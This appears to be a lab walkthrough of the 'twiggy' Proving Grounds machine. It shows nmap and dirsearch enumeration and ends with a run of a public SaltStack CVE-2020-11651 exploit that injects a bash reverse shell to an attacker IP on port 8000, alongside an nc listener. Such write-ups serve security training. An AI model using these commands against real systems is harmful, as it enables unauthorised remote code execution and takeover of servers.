nmap
```
┌──(kali㉿kali)-[~/PG/twiggy]
└─$ nmap -p- --min-rate 10000 192.168.188.62                                  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 21:22 EST
Nmap scan report for 192.168.188.62
Host is up (0.047s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
4505/tcp open  unknown
4506/tcp open  unknown
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 13.54 seconds
                                                                                                                                                    
┌──(kali㉿kali)-[~/PG/twiggy]
└─$ nmap -p 22,53,80,4505,4506,8000 -sCV 192.168.188.62                       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 21:23 EST
Nmap scan report for 192.168.188.62
Host is up (0.043s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)
|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)
|_  256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
|_http-title: Home | Mezzanine
|_http-server-header: nginx/1.16.1
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1
|_http-title: Site doesn't have a title (application/json).
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.16.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.20 seconds
```

![Pasted image 20250209102716](<0. Attachments/Pasted image 20250209102716.png>)

![Pasted image 20250209103020](<0. Attachments/Pasted image 20250209103020.png>)

![Pasted image 20250209103225](<0. Attachments/Pasted image 20250209103225.png>)

```
┌──(kali㉿kali)-[~/PG/twiggy]
└─$ dirsearch -u http://192.168.188.62/        
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/PG/twiggy/reports/http_192.168.188.62/__25-02-08_21-29-09.txt

Target: http://192.168.188.62/

[21:29:09] Starting: 
[21:29:10] 301 -    0B  - /%C0%AE%C0%AE%C0%AF  ->  /%25C0%25AE%25C0%25AE%25C0%25AF/
[21:29:10] 301 -    0B  - /%ff  ->  /%25FF/                                 
[21:29:34] 302 -    0B  - /admin/  ->  /admin/login/?next=/admin/           
[21:30:01] 404 -    6KB - /blog/wp-content/backups/                         
[21:30:01] 404 -    6KB - /blog/phpmyadmin/
[21:30:02] 404 -    6KB - /blog/wp-content/backup-db/                       
[21:30:02] 200 -    6KB - /blog/                                            
[21:30:22] 404 -  555B  - /favicon.ico                                      
[21:31:22] 301 -    0B  - /servlet/%C0%AE%C0%AE%C0%AF  ->  /servlet/%25C0%25AE%25C0%25AE%25C0%25AF/
[21:31:27] 200 -  530B  - /sitemap.xml                                      
[21:31:31] 404 -  555B  - /static/api/swagger.json                          
[21:31:31] 404 -  555B  - /static/dump.sql                                  
[21:31:31] 404 -  555B  - /static/api/swagger.yaml                          
                                                                             
Task Completed
                                                                                                                                                   
┌──(kali㉿kali)-[~/PG/twiggy]
└─$ dirsearch -u http://192.168.188.62:8000/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                   
 (_||| _) (/_(_|| (_| )                                                                                                                            
                                                                                                                                                   
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/PG/twiggy/reports/http_192.168.188.62_8000/__25-02-08_21-35-50.txt

Target: http://192.168.188.62:8000/

[21:35:50] Starting:                                                                                                                               
[21:37:18] 401 -  753B  - /events                                           
[21:37:20] 404 -  555B  - /favicon.ico                                      
[21:37:37] 401 -  441B  - /jobs                                             
[21:37:44] 200 -   43B  - /login                                            
[21:37:44] 200 -   43B  - /login/                                           
[21:37:44] 404 -  435B  - /login/admin/                                     
[21:37:44] 404 -  435B  - /login/cpanel.php                                 
[21:37:44] 404 -  435B  - /login/cpanel.aspx
[21:37:44] 404 -  435B  - /login/cpanel.jsp
[21:37:44] 404 -  435B  - /login/administrator/
[21:37:44] 404 -  435B  - /login/index
[21:37:44] 404 -  435B  - /login/cpanel/                                    
[21:37:44] 404 -  435B  - /login/super
[21:37:44] 404 -  435B  - /login/cpanel.html
[21:37:44] 404 -  435B  - /login/admin/admin.asp
[21:37:44] 404 -  435B  - /login/cpanel.js
[21:37:44] 404 -  435B  - /login/login                                      
[21:37:44] 404 -  435B  - /login/oauth/                                     
[21:37:46] 500 -  823B  - /logout                                           
[21:37:46] 500 -  823B  - /logout/                                          
[21:38:38] 401 -  441B  - /stats                                            
[21:38:38] 401 -  441B  - /stats/                                           
                                                                             
Task Completed 
```

https://www.exploit-db.com/exploits/48421

![Pasted image 20250209105923](<0. Attachments/Pasted image 20250209105923.png>)

![Pasted image 20250209110042](<0. Attachments/Pasted image 20250209110042.png>)

![Pasted image 20250209122715](<0. Attachments/Pasted image 20250209122715.png>)

```
openssl passwd root
```

![Pasted image 20250209122835](<0. Attachments/Pasted image 20250209122835.png>)

![Pasted image 20250209122914](<0. Attachments/Pasted image 20250209122914.png>)

![Pasted image 20250209123002](<0. Attachments/Pasted image 20250209123002.png>)

![Pasted image 20250209123101](<0. Attachments/Pasted image 20250209123101.png>)

another way
```
$ python3 exploit.py --master 192.168.246.62 --exec "bash -i >& /dev/tcp/192.168.49.246/8000 0>&1"
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Checking salt-master (192.168.246.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: 5u3LOWydLI0nuQQVb7ylzbEKeWTZvhaLeT0w9RTHBYtq6lq0stud6KdzDTJa9WtWXOQzF27Bg1s=
[+] Attemping to execute bash -i >& /dev/tcp/192.168.49.246/8000 0>&1 on 192.168.246.62
[+] Successfully scheduled job: 20210907064003509671

$ nc -lvnp 8000
```